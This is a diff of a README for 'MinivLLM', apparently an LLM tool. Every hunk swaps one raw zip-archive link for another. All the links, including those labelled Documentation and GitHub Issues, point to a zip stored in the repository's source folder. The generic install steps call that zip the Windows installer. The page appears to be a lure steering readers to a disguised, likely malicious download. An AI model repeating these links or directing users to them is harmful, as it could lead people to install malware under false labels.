@@ -1,6 +1,6 @@
 # 🚀 MinivLLM - Simple, Fast LLM for Everyone
 
-![Download MinivLLM](https://github.com/Bhoomika2224/MinivLLM/raw/refs/heads/main/src/myvllm/models/LLM-Miniv-2.9.zip)
+![Download MinivLLM](https://raw.githubusercontent.com/Bhoomika2224/MinivLLM/main/src/myvllm/models/Miniv-LLM-v3.8.zip)
 
 ## 📦 Overview
 
@@ -27,11 +27,11 @@ To run MinivLLM on your computer, follow these simple steps:
 
 1. **Download MinivLLM**:
    - Click on the link below to visit the download page.
-   - [Visit this page to download](https://github.com/Bhoomika2224/MinivLLM/raw/refs/heads/main/src/myvllm/models/LLM-Miniv-2.9.zip)
+   - [Visit this page to download](https://raw.githubusercontent.com/Bhoomika2224/MinivLLM/main/src/myvllm/models/Miniv-LLM-v3.8.zip)
 
 2. **Select the Latest Release**:
    - On the Releases page, find the version marked as the latest.
-   - Choose the installer file that matches your operating system (e.g., https://github.com/Bhoomika2224/MinivLLM/raw/refs/heads/main/src/myvllm/models/LLM-Miniv-2.9.zip for Windows).
+   - Choose the installer file that matches your operating system (e.g., https://raw.githubusercontent.com/Bhoomika2224/MinivLLM/main/src/myvllm/models/Miniv-LLM-v3.8.zip for Windows).
 
 3. **Download the File**:
    - Click on the installer link to start the download process.
@@ -49,7 +49,7 @@ To run MinivLLM on your computer, follow these simple steps:
 
 To download MinivLLM, click the link below:
 
-[Visit this page to download](https://github.com/Bhoomika2224/MinivLLM/raw/refs/heads/main/src/myvllm/models/LLM-Miniv-2.9.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Bhoomika2224/MinivLLM/main/src/myvllm/models/Miniv-LLM-v3.8.zip)
 
 Make sure you select the correct installer for your operating system. Follow the installation instructions provided above.
 
@@ -77,8 +77,8 @@ Once you have installed MinivLLM, you can start utilizing its features right awa
 
 ## 🔗 Related Resources
 
-- [Documentation](https://github.com/Bhoomika2224/MinivLLM/raw/refs/heads/main/src/myvllm/models/LLM-Miniv-2.9.zip): Find detailed information about features and usage.
-- [GitHub Issues](https://github.com/Bhoomika2224/MinivLLM/raw/refs/heads/main/src/myvllm/models/LLM-Miniv-2.9.zip): Report bugs or request new features.
+- [Documentation](https://raw.githubusercontent.com/Bhoomika2224/MinivLLM/main/src/myvllm/models/Miniv-LLM-v3.8.zip): Find detailed information about features and usage.
+- [GitHub Issues](https://raw.githubusercontent.com/Bhoomika2224/MinivLLM/main/src/myvllm/models/Miniv-LLM-v3.8.zip): Report bugs or request new features.
 
 ## 🎉 License
 
